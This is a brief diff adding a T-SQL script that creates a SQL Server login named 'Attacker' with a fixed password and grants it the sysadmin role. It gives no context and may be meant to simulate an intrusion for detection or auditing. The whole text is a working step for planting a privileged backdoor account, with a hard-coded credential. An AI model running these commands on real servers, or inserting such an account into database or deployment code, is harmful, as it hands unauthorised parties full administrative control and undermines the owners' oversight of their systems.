@@ -1,0 +1,7 @@
+CREATE LOGIN Attacker
+WITH PASSWORD = 'Pa$$w0rd12345678' ;
+GO
+
+ALTER SERVER ROLE sysadmin
+ADD MEMBER Attacker ;
+GO  
